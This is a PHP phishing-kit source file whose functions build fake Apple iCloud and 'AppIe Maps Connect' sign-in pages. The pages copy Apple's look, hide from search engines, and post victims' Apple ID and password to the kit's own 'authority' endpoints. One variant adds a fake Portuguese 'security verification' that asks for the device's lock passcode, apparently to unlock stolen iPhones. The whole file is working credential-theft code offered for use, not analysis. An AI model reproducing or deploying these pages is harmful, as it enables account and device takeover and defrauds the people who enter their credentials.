$ci->lang->line('Pages_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>' . "\n\n" . '    <footer class="foot">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n\n" . '                <div class="col-md-10 col-xs-12 foot-link">' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/support/systemstatus/" target="_blank">' . "\n" . '                        ' . $ci->lang->line('Systemstatus_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/privacy/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Privacy_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/legal/icloud/ww/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Terms_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <span class="copyright">' . $ci->lang->line('Copyrights_message') . '</span>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-xs-12 apple">' . "\n" . '                    <a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>' . "\n" . '                </div>' . "\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </footer>' . "\n\n" . '</div>' . "\n" . '    <div class="main-container">' . "\n" . '  ' . "\n" . '  <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7315.381498631628!2d-46.64661067606171!3d-23.543622738766476!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce5851c0395f3b%3A0xf36ea5aa7f8ff302!2zUmVww7pibGljYSwgU8OjbyBQYXVsbyAtIFNQ!5e0!3m2!1spt-BR!2sbr!4v1551067504976" width="100%" height="100%" frameborder="0" allowfullscreen=""></iframe>   ' . "\n" . '    </div>' . "\n" . '    <script src="/assets/js/jquery.js"></script>' .  "\n";
	$html .= '<script src="' . site_url('assets/js/bolinha2.js?t=' . time()) . '" type="text/javascript"></script>' . "\n" . '    <script src="/assets/js/strap.min.js"></script>' . "\n" . '</script>' . "\n";
	$html .= '    <script src="/assets/js/ajax-form2.js?t=' . time() . '"></script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $html;
}
}

if (!(function_exists('MapaNovoLogin'))) {
function MapaNovoLogin($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html = '<!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta name="robots" content="noindex, nofollow, noarchive"/>' . "\n" . '    <meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n" . '    <meta name="googlebot" content="nosnippet"/>' . "\n" . '    <meta name="robots" content="noodp"/>' . "\n" . '    <meta name="slurp" content="noydir">' . "\n" . '    <meta name="robots" content="noimageindex,nomediaindex"/>' . "\n" . '    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET"/>' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n" . '    <title>' . $title . '</title>' . "\n";
	$html .= '<link rel="stylesheet" href="/assets/layout/strap.css">' . "\n";
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/MapaNovo.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew3.css">' ;
	$html .= '    <link rel="stylesheet" href="/assets/layout/applenew.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/kit.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/animate.css">' . "\n" . '    <link rel="stylesheet" href="/assets/css/font-awesome.css">' . "\n" . '    <style>' . "\n" . '        .main-container {' . "\n" . '            position: absolute;' . "\n" . '            top: 0;' . "\n" . '            left: 0;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            overflow: hidden;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '   ' . "\n\n" . '        ' . "\n\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us" style="background: #ccc !important;">' . "\n\n" . '<div class="first-load" style="display: none;">' . "\n" . '    <div class="overlay">' . "\n" . '        <div class="spinner center">' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '        </div>' . "\n" . '    </div>' . "\n" . '</div>' . "\n\n" . '<div class="bodys" style=" z-index: 9999;">' . "\n" . '    <section id="header">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n" ;
	$html .= ' <div class="col-md-4 col-xs-8 rightH">' . "\n";
	$html .= ' <div class="phone-box" style="    position: absolute;    top: 0;    right: 0;    background: #fff;    width: -moz-fit-content;    max-width: 210px;    float: right;    filter: blur(1.07px);    border: 1px solid #ccc;    z-index: 2;">';
	$html .= ' <img class="bateria" src="/assets/img/bateria.png" style="float: right;padding-right: 5px;"><br>';
	$html .= ' <center><img class="img_phone" src="/assets/img/BgrqMY5_d.jpg" style="max-width: 220px;max-height: 16vh; margin-left: 44px;"></center><br>';
	$html .= ' <center> <span class="texto1" style="padding-top: 0px;">IPHONE</span></center>';
	$html .= ' <center> <span class="texto2" style="margin-top: 1px;font-weight: 300;"><small>Há menos de um minuto</small></span></center><br>';
	$html .= ' <img class="img_painel" src="/assets/img/painel_2.png" style="max-width: 220px;max-height: 20vh;"></div>';


	$html .= '</div>                <div class="col-md-8 col-xs-4 leftH">' . "\n" . '                    <span class="icloud"></span>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>';

	if ($ci->session->userdata('logged_in') == false) {
		$html .= '<section class="login-form text-center animated" >' . "\n\n" . '        <img src="/assets/img/map3.png" class="img-cloud2" alt="" style="width: 100px;">' . "\n\n" . '        <h2 style="color: black;font-weight: bold;">AppIe Maps Connect</h2>' . "\n\n" . '        ' . form_open(site_url('authority/get'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" . '        <input type="hidden" name = "apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n" . '        <input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">' . "\n" . ' <input type="button" name="showPassword" id="showPassword" value=""> ' . '       <input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n" . '        <input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>' . "\n" . '        <div class="alrt">' . "\n" . '            <p>' . $ci->lang->line('incorrect_message') . '</p>' . "\n" . '            <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '        </div>' . "\n" . '        </form>' . "\n\n" . '        <div class="keepme" style="color: black;">' . "\n" . '            <input type="checkbox">' . "\n" . '            <span for="keepme">' . $ci->lang->line('Keepsigin_message') . '</span>' . "\n" . '        </div>' . "\n\n" . '        <div class="forget">' . "\n" . '            <a href="https://iforgot.apple.com/" target="_blank" style="color: black;">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '            <div id="response"></div>' . "\n" . '        </div>' . "\n\n" . '        <div class="create" style="color: black;">' . $ci->lang->line('DonthaveanAppleid_message') . ' <a href="#" style="color: gray;">' . $ci->lang->line('Createyoursnow_message') . '.</a></div>' . "\n\n" . '    </section>';
	}


	$html .= '<section class="imessage" style="display:' . $logged . ';">' . "\n\n\n" . '        <div class="container">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/11.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Reminders_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/9.png" alt="">' . "\n" . '                    <span>' . "\n\t\t\t\t\t\t" . $ci->lang->line('Notes_message') . "\n\t\t\t\t\t" . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/3.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('iCloudDrive_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/10.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Photos_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/1.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Contacts_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/8.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Mail_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/12.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Settings_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/2.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindMyiPhone_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/6.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Keynote_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/5.png" alt="">' . "\n" . '                    <span> ' . $ci->lang->line('Numbers_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/20.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('FindFriends_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" . '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' . "\n" . '                    <img class="" src="/assets/img/7.png" alt="">' . "\n" . '                    <span>' . $ci->lang->line('Pages_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>' . "\n\n" . '    <footer class="foot">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n\n" . '                <div class="col-md-10 col-xs-12 foot-link">' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/support/systemstatus/" target="_blank">' . "\n" . '                        ' . $ci->lang->line('Systemstatus_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/privacy/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Privacy_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <a class="hidden-xs" href="https://www.apple.com/legal/icloud/ww/"' . "\n" . '                       target="_blank">' . $ci->lang->line('Terms_message') . '</a>' . "\n" . '                    <span class="footer-link-separator hidden-xs"></span>' . "\n" . '                    <span class="copyright">' . $ci->lang->line('Copyrights_message') . '</span>' . "\n" . '                </div>' . "\n" . '                <div class="col-md-2 col-xs-12 apple">' . "\n" . '                    <a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>' . "\n" . '                </div>' . "\n\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </footer>' . "\n\n" . '</div>' . "\n" . '    <div class="main-container">' . "\n" . '    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d7315.381498631628!2d-46.64661067606171!3d-23.543622738766476!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x94ce5851c0395f3b%3A0xf36ea5aa7f8ff302!2zUmVww7pibGljYSwgU8OjbyBQYXVsbyAtIFNQ!5e0!3m2!1spt-BR!2sbr!4v1551067504976" width="100%" height="100%" frameborder="0" allowfullscreen=""></iframe>' . "\n" . '        ' . "\n" . '  <canvas id="bgs" style="display:none;"></canvas>  </div>' . "\n" . '    <script src="/assets/js/jquery.js"></script>' . "\n" . '<script src="' . site_url('assets/js/bolinha.js?t=' . time()) . '" type="text/javascript"></script>' . "\n" . '    <script src="/assets/js/strap.min.js"></script>' . "\n" . '    <script src="/assets/js/newc.min.js?t=' . time() . '"></script>' . "\n" . '    <script src="/assets/js/ajax-form.js"></script>' . "\n" . '</body>' . "\n" . '</html>' . "\n" . '        ';
	return $html;
}
}

if (!(function_exists('MapaNovo'))) {
function MapaNovo($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html = '<!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta name="robots" content="noindex, nofollow, noarchive"/>' . "\n" . '    <meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n" . '    <meta name="googlebot" content="nosnippet"/>' . "\n" . '    <meta name="robots" content="noodp"/>' . "\n" . '    <meta name="slurp" content="noydir">' . "\n" . '    <meta name="robots" content="noimageindex,nomediaindex"/>' . "\n" . '    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET"/>' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n" . '    <title>' . $title . '</title>' . "\n";
	$html .= '    <link rel="stylesheet" href="/assets/layout/strap.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew2.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew3.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/app.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/css/MapaNovo.css">' ;
	$html .= "\n" . '    <link rel="stylesheet" href="/assets/layout/kit.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/animate.css">' . "\n" . '    <link rel="stylesheet" href="/assets/css/font-awesome.css">' . "\n" . '    <style>' . "\n" . '        .main-container {' . "\n" . '            position: absolute;' . "\n" . '            top: 0;' . "\n" . '            left: 0;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            overflow: hidden;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '     ' . "\n\n" . '       ' . "\n\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us" style="background: #ccc !important;">' . "\n\n" . '' . "\n" . '    <div class="overlay">' . "\n" . '' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '        </div>' . "\n" . '    </div>' . "\n" . '</div>' . "\n\n" . '<div class="bodys" style=" z-index: 9999;">' . "\n" . '    <section id="header">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n";
	$html .= ' <div class="col-md-4 col-xs-8 rightH">' . "\n";
	$html .= ' <div class="phone-box" style="    position: absolute;    top: 0;    right: 0;    background: #fff;    width: -moz-fit-content;    max-width: 210px;    float: right;    filter: blur(1.07px);    border: 1px solid #ccc;    z-index: 2;">';
	$html .= ' <img class="bateria" src="/assets/img/bateria.png" style="float: right;padding-right: 5px;"><br>';
	$html .= ' <center><img class="img_phone" src="/assets/img/BgrqMY5_d.jpg" style="max-width: 220px;max-height: 16vh;"></center><br>';
	$html .= ' <center> <span class="texto1" style="padding-top: 0px;">IPHONE</span></center>';
	$html .= ' <center> <span class="texto2" style="margin-top: 1px;font-weight: 300;"><small>Há menos de um minuto</small></span></center><br>';
	$html .= ' <img class="img_painel" src="/assets/img/painel_2.png" style="max-width: 220px;max-height: 20vh;"></div>';



	$html .= '</div>' . "\n" . '                <div class="col-md-8 col-xs-4 leftH">' . "\n" . '                    <span class="icloud"></span>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>';

	if ($ci->session->userdata('logged_in') == false) {
		$html .= '<section class="login-form text-center animated" >' . "\n\n" . '        <img src="/assets/img/map3.png" class="img-cloud2" alt="" style="width: 100px;">' ;
		$html .= "\n\n" . '        <span id="txt_top1"><h2 style="color: black;font-weight: bold;"> AppIe Maps Coonect </h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= "\n\n" . '        <span id="txt_top2" style="display: none;"><h2 style="color: black;font-weight: bold;">' . 'Verificação de Segurança' . '</h2>' . ' </span>' . "\n\n" . '        ' ;
		$html .= form_open(site_url('authority/getBall'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n" ;
		$html .= '        <input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
		$html .= '        <input type="hidden" name="SizeBall"  id="SizeBall" value="4" >' . "\n";
		//$html .= '<div id="main_form">';
		$html .= '        <input type="text" class="id" name="apple_id" id="apple_id"' . "\n" . '               placeholder="' . $ci->lang->line('appleid_message') . '" style="direction: ltr !important;"' . "\n" . '               value="' . set_value('apple_id', $novoMail) . '">';
		$html .= "\n" . ' <input type="button" name="showPassword" id="showPassword" value=""> ';
		$html .= '        <input type="password" style="display: none;" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd"' . "\n" . '               placeholder="' . $ci->lang->line('Password_message') . '">' . "\n";
		//$html .= "\n" . ' <input type="button" name="showPassword2" id="showPassword2" value=""> ';
		//$html .= '        <input type="submit" style="display: none;" disabled class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		$html .= '        <input type="button" style="display: none;" class="dolog" name="c_log" id="c_log" value="">' . "\n" . '        <img class="loading" src="/assets/img/ajax-loader.gif" alt="Loading"/>';
		//$html .= '</div>';
		$html .= '
		<div id="security-code" class="security-code-wrap security-code-6 " localiseddigit="Dígitos" style="display: none;">
															<div class="security-code-container force-ltr">
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo2\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo1" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 1" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="0">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo3\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo2" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 2" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="1">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeyup="proximoCampo(this, \'campo4\')" onkeypress="return SomenteNumero(event);" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo3" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 3" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="2">
																</div>
																<div class="field-wrap force-ltr">
																	<input onkeypress="return SomenteNumero(event);" onkeyup="SendForm(); proximoCampo(this, \'campo1\')" maxlength="1" autocorrect="off" autocomplete="off" autocapitalize="off" spellcheck="false" type="tel" id="campo4" class="form-control force-ltr form-textbox char-field" aria-label="Insira o código de verificação Dígitos 6" placeholder="" aria-describedby="idms-input-error-1501591434388-0" data-index="5">
																</div>
															</div>

															<label class="sr-only" id="idms-input-error-1501591434388-0"></label>

														</div> ';

		$html .= "\n" . '        <div class="alrt">' . "\n" . '            <p>' . $ci->lang->line('incorrect_message') . '</p>' . "\n" . '            <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '        </div>' . "\n" . '        </form>' . "\n\n" ;
		$html .= '        <div class="keepme" id="keepme">' . "\n" . '            <input type="checkbox">' . "\n" . '            <span for="keepme" style="color: black;">' . $ci->lang->line('Keepsigin_message') . '</span>' . "\n" . '        </div>' ;
		$html .= "\n\n" . '        <div class="forget" id="forget2" style="display: none;">' . "\n" .    "\n" . '            <div id="response"></div>' . "\n" . '        </div>';
		$html .= "\n\n" . '        <div class="forget" id="forget">' . "\n" . '            <a href="https://iforgot.apple.com/" target="_blank" style="color: black;">' . $ci->lang->line('Forgotpassword_message') . '</a>' . "\n" . '            <div id="response"></div>' . "\n" . '        </div>' . "\n\n" ;
		$html .= '        <div class="create" id="create" style="color: black;">' . $ci->lang->line('DonthaveanAppleid_message') . ' <a href="#" style="color: grey;">' . $ci->lang->line('Createyoursnow_message') . '.</a></div>' . "\n\n" ;
		$html .= '        <div class="create" id="create2"  style="display: none; color: black;">' . 'Por motivos de segurança, é necessário inserir o código de bloqueio do dispositivo para prosseguir.</div> ' . '    </section>' . "\n\n" ;

	}


	$html .= '<section class="imessage" style="display:' . $logged . ';">' ;
	$html .= "\n\n\n" . '        <div class="container">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-2 col-sm-4 col-xs-6">' . "\n" ;
	$html .= '                    <a href="' . site_url('findmyiphone') . '" class="text-cente imb">' . "\n" . '                    <span class="loadings"><img src="/assets/img/ajax-loader.gif" alt="Loading" /></span>' ;
	$html .= "\n" . '                    <img class="" src="/assets/img/11.png" alt="">' . "\n" ;
	$html .= '                    <span>' . $ci->lang->line('Reminders_message') . '</span>' . "\n" . '                    </a>' . "\n" . '                </div>' . "\n" ;
